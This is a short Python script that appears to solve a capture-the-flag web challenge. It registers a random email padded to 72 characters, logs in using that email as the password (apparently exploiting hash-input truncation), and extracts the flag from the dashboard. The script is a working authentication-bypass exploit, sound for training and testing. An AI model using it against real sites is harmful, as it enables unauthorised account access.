import requests
import sys
import random
import string
import re

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

name = "".join(random.choices(string.ascii_lowercase, k=16))
domain = "gmail.com"
email = f"{name}+{'A'*(72 - 2 - len(name+domain))}@{domain}"

print(f"Email: {email}")

with requests.Session() as session:
    session.post(f"{BASE_URL}/user", data={"email": email})
    session.post(f"{BASE_URL}/session", data={"email": email, "password": email})
    dashboard = session.get(f"{BASE_URL}/dashboard").text
    match = re.search(r'<span id="flag">(.*)<\/span>', dashboard)
    print(f"Flag: {match.group(1)}")
    session.get(f"{BASE_URL}/logout")
